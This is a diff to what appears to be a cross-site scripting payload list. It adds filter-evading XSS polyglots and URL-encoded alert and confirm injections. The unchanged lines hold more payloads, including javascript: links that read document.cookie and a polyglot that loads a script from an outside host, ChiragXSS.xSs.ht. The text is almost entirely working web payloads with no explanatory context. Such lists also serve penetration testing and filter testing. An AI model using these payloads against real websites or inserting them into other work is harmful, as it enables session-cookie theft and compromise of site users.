@@ -19,6 +19,7 @@ https://xyz/xx/xx/?q=abc`;return false});});alert`xss`;</script>
 or using encoding
 https://xyz/xx/xx/?q=abc%60%3Breturn%20false%7D)%3B%7D)%3Balert%60xss%60%3B%3C%2Fscript%3E
 
+'"1<!--></Title/</Textarea/</Script/><Details/Open/OnToggle=(confirm)(1)>
 <a/href="j&#97v&#97script&#x3A;&#97lert(document.cookie)">ClickMe
 
 "></div><a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;document.cookie&rpar;">
@@ -67,7 +68,10 @@ xss
 best <img src onerror=alt=''+document.domain>
 '"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//ChiragXSS.xSs.ht></scripT>
 2022 Best XSS polyglot ⚠️
-
+%27%3Balert(%27V_3_3_r%27)%2F%2F
+">><img%20src=x%20onerror=confirm("V_3_3_r")>&type=
+%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+place%22%3E%3Csvg+onload=confirm(document.domain)%3E
 '"onclick=(co\u006efirm)?.0><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)1"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert2>%22%3E%3CSvg/onload=confirm3//<Script/src=//ChiragXSS.xSs.ht></scripT>
 "}<script>alert(document.cookie)</script>
 "}<script>prompt(document.domain)</script>
